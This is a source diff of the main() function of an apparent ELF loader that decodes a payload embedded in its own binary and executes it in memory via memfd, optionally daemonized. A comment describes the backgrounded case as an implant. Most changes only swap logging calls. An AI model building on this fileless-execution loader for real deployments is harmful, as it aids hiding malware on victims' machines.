@@ -36,19 +36,21 @@ int main(int argc, char **argv) {
                     ch = (int) (unsigned char) argv[n][m];
                     switch (ch) {
                         case 'd':
-                            debug_print("Option: daemonize %c\n", ch);
+                            dprint("Option: daemonize %c\n", ch);
                             do_daemon = true;
                             break;
                         case 'm':
-                            debug_print("Option: memfd_fallback %c\n", ch);
+                            dprint("Option: memfd_fallback %c\n", ch);
                             exec_memfd = true;
                             break;
                         case '-':
-                            debug_print("Option: double dash %c\n", ch);
+                            dprint("Option: double dash %c\n", ch);
+                            dprint("Option: end options\n");
                             // End opts, skip counting
                             ++a;
-                            goto end_opts;
+                            goto end_opts; // crude but
                         default:
+                            dprint("Illegal option in command %c\n", ch);
                             err(EXIT_FAILURE, "Illegal option in command %c\n", ch);
                             break;
                     }
@@ -62,12 +64,16 @@ int main(int argc, char **argv) {
 
     end_opts:
 
+    // Setup callee args
+    dprint("Setup: callee args\n");
     set_exec_args(&new_argv, &argv, argc, a);
 
     // What is our path (use /proc, assuming it's available)
+    dprint("Setup: getting FS path\n");
     filesystem::path my_path = get_executable_path();
 
     // Load host ELF data
+    dprint("ELF reader: loading FS path\n");
     if (!reader.load(my_path)) {
         cerr << "Can't find or process src ELF file: " << argv[0] << endl;
         exit(AFAULT);
@@ -104,7 +110,7 @@ int main(int argc, char **argv) {
 #endif
 
                     } else if (strcmp((char *) algo_data, "A") == 0) {
-                        // AES ...
+                        // AES ... Exercise for the reader
                         ;
                     } else /* default: */
                     {
@@ -112,18 +118,16 @@ int main(int argc, char **argv) {
                     }
 
 
-                    // Handling launch context: stay foreground (simple command), or background it (e.g. implant)
+                    // Handling launched context: stay foreground (simple command), or background it (e.g. implant)
                     if (do_daemon) {
-                        debug_print("%s\n", "Load_exec daemonized");
+                        dprint("Load_exec daemonized\n");
                         // Passing load_exec function w/parameters to daemonizer
-                        daemonize(
-                                (mem_exec) (load_exec), exec_memfd, (unsigned char const *) p_data, &new_argv);
+                        daemonize( (mem_exec) (load_exec), exec_memfd, (unsigned char const *) p_data, &new_argv);
                     } else {
-                        debug_print("%s\n", "Load_exec no daemon");
+                        dprint("Load_exec no daemon\n");
                         load_exec(exec_memfd, (unsigned char const *) p_data, &new_argv);
                     }
 
-                    set_psection_data(reader, psec_num, psec_size, my_path.c_str() );
                 } else {
                     err(EXIT_FAILURE, "Data context cannot be retrieved for psec_num %d ", psec_num);
                 }
